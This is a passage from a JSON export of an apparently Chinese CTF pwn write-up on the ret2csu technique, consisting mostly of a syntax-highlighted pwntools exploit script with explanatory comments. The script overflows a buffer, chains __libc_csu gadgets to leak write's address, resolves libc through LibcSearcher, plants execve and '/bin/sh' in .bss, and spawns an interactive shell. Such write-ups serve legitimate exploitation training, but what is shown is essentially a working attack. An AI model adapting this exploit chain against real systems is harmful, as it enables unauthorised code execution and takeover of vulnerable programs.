data-num=\"19\"></td><td><pre>    payload<span class=\"token operator\">+=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">56</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\">#56 是将 add rsp，8 以及之后的总共 7 行全覆盖掉 7*8，前面已经给 rdx,rsi,edi 赋值了，再改变也没有影响</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>    <span class=\"token comment\">#不能用 sendline，会出错</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>write_really<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre> </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>write_really<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>libc_base<span class=\"token operator\">=</span>write_really<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>execve<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'execve'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>read<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>bss_base<span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>execve<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>bss_base<span class=\"token punctuation\">,</span>bss_base<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#bss_base 相当于是 execve 的地址，bss_base+8 是到了 execve 的参数 \"/bin/sh\\x00\"</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://img-blog.csdnimg.cn/c98c4ed447994c66ac1d2bfc64b9f3c0.png\" alt=\"\" /></p>\n<p>参考链接 ret2csu：<span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9ESXFZdg==\">http://t.csdn.cn/DIqYv</span></p>\n",
            "tags": [
                "pwn",
                "ret2csu",
                "ctf"
            ]
        }
    ]
}